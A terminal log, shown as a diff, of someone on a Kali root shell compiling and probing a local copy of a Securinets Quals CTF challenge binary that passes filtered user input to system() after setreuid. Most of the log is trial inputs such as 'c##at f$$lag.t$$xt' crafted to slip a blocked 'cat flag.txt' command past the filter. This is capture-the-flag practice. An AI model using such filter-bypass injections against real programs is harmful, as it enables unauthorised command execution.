@@ -1,0 +1,219 @@
+root@kali:~/Downloads# vi wrapper.c 
+root@kali:~/Downloads# gcc wrapper.c -o wrap
+wrapper.c: In function ‘main’:
+wrapper.c:52:12: warning: unknown escape sequence: '\o'
+     printf("Welcome to Securinets Quals CTF \o/ \n");
+            ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+wrapper.c:54:5: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
+     read(0,str,79);
+     ^~~~
+     fread
+wrapper.c:71:1: warning: implicit declaration of function ‘setreuid’; did you mean ‘getdelim’? [-Wimplicit-function-declaration]
+ setreuid(geteuid(),geteuid());
+ ^~~~~~~~
+ getdelim
+wrapper.c:71:10: warning: implicit declaration of function ‘geteuid’; did you mean ‘getdelim’? [-Wimplicit-function-declaration]
+ setreuid(geteuid(),geteuid());
+          ^~~~~~~
+          getdelim
+wrapper.c:72:1: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
+ close(0);
+ ^~~~~
+ pclose
+wrapper.c:73:1: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+ system(str);
+ ^~~~~~
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+www
+www
+sh: 1: www: not found
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+cat
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+cat flag.txt
+sh: 1: : not found
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+\0cat flag.txt
+sh: 1: 0: not found
+\0root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+cat \0less flag.txt
+sh: 1: 0�: not found
+\0�root@kali:~/Downloads# vi wrapper.c 
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c\0a\0t                  
+c\0a\0t
+sh: 1: c0a0t: not found
+sh: 2: ����: not found
+����root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c#a#t
+c#t
+sh: 1: c#t: not found
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##a##t
+ca##t
+sh: 1: ca##t: not found
+sh: 2: �u�GS: not found
+�u�GSroot@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at
+cat
+cat: -: Bad file descriptor
+cat: closing standard input: Bad file descriptor
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f##lag.txt
+cat: 'f##lag.T'$'\367\375\377\177': No such file or directory
+cat f##lag.T���root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+w##elcome
+welcome
+sh: 1: welcome: not found
+sh: 2: �9�: not found
+�9�root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+./w##elcome
+./welcome
+sh: 1: ./welcome: Permission denied
+sh: 2: �: not found
+�root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f##lag.t#xt
+cat f##lag.t#xt
+cat: f##lag.t#xt: No such file or directory
+sh: 2: �0�: not found
+�0�root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at flag##.txt
+cat: -: Bad file descriptor
+cat: closing standard input: Bad file descriptor
+cat #.Ȕ	�root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+cat 
+
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at flag.txt
+cat: -: Bad file descriptor
+cat: closing standard input: Bad file descriptor
+cat root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f#l#a#g.t#x#t
+cat f#l#a#g.t#x#t
+cat: f#l#a#g.t#x#t: No such file or directory
+sh: 2: �: not found
+�root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at flag.txt
+cat: -: Bad file descriptor
+cat: closing standard input: Bad file descriptor
+cat root@kali:~/Downloads# vi wrapper.c 
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+^C
+root@kali:~/Downloads# vi wrapper.c 
+root@kali:~/Downloads# gcc wrapper.c -o wrap
+wrapper.c: In function ‘main’:
+wrapper.c:52:12: warning: unknown escape sequence: '\o'
+     printf("Welcome to Securinets Quals CTF \o/ \n");
+            ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+wrapper.c:54:5: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
+     read(0,str,79);
+     ^~~~
+     fread
+wrapper.c:71:1: warning: implicit declaration of function ‘setreuid’; did you mean ‘getdelim’? [-Wimplicit-function-declaration]
+ setreuid(geteuid(),geteuid());
+ ^~~~~~~~
+ getdelim
+wrapper.c:71:10: warning: implicit declaration of function ‘geteuid’; did you mean ‘getdelim’? [-Wimplicit-function-declaration]
+ setreuid(geteuid(),geteuid());
+          ^~~~~~~
+          getdelim
+wrapper.c:72:1: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
+ close(0);
+ ^~~~~
+ pclose
+wrapper.c:73:1: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+ system(str);
+ ^~~~~~
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at flag.txt
+cat: -: Bad file descriptor
+cat: closing standard input: Bad file descriptor
+Execuring... cat root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f##lag.txt
+cat: 'f##lag.[~'$'\374\377\177': No such file or directory
+Execuring... cat f##lag.[~��root@kali:~/Downloads# vi wrapper.c 
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f##laf
+Execuring... cat f##laf
+cat: f##laf: No such file or directory
+sh: 2: : not found
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f##lag
+Execuring... cat f##lag
+cat: f##lag: No such file or directory
+sh: 2: : not found
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at flag
+cat: ''$'\236''N'$'\177': No such file or directory
+Execuring... cat �Nroot@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f$lag
+Execuring... cat fag
+cat: fag: No such file or directory
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f$$lag
+Execuring... cat flag
+cat: flag: No such file or directory
+sh: 2: : not found
+root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f$$lag.txt
+cat: 'flag.s'$'\330\030\377\177': No such file or directory
+Execuring... cat flag.s��root@kali:~/Downloads# ./wrap 
+Welcome to Securinets Quals CTF o/ 
+Enter string:
+c##at f$$lag.t$$xt
+Execuring... cat flag.txt
+
